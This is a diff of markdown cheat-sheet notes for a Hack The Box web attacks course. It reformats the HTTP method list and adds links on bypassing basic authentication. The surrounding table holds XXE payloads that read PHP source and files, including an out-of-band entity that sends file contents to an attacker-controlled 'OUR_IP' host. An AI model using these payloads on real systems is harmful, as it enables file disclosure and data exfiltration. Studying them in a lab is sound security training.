@@ -8,16 +8,22 @@
 >HTTP has 9 different [verbs](https://academy.hackthebox.com/module/134/section/1159) that can be accepted as HTTP methods by web servers.  
 >[HTTP Request Methods Mozilla Reference](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods)  
 
-`HTTP Method`
-- `GET`
-- `HEAD`
-- `POST`
-- `PUT`
-- `DELETE`
-- `CONNECT`
-- `OPTIONS`
-- `PATCH`
-- `TRACE`
+### HTTP Methods  
+```
+GET
+HEAD
+POST
+PUT
+DELETE
+CONNECT
+OPTIONS
+PATCH
+TRACE
+```  
+
+>[Bypassing Basic Authentication](https://academy.hackthebox.com/module/134/section/1175)  
+
+
   
 | **Command**   | **Description**   |
 | --------------|-------------------|
@@ -45,3 +51,8 @@
 | `<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">` | Read PHP source code with base64 encode filter |
 | `<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">` | Reading a file through a PHP error |
 | `<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">` | Reading a file OOB exfiltration |
+
+# Web Attack Exercises  
+
+>Try to use what you learned in this section to access the 'reset.php' page and delete all files. Once all files are deleted, you should get the flag.  
+
